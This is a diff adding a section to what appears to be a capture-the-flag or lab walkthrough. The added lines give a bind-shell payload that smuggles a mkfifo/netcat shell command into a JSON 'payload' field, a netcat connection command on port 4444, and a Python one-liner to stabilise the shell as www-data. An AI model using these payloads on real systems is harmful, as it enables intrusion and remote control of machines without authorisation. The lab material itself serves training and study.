@@ -98,6 +98,15 @@ There are three primary ways into the system.
    ```
    Confirm the top comments repeat `flag{initial-access-path-c-rce}` and point you to `DEVOPS_SSH_PASSWORD`.
 
+Bind Shell Payload:
+```
+1:{"mode":"preview","action":{"type":"import","payload":"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/bash -i 2>&1|nc -l 4444 >/tmp/f &"}}
+```
+Connection Command: ncat.exe <SERVER_IP> 4444
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")' to fix line-ending issues and stabilize the shell.
+```
+Current User: www-data
 ---
 
 ## 📈 Phase 3: Lateral Movement & Escalation
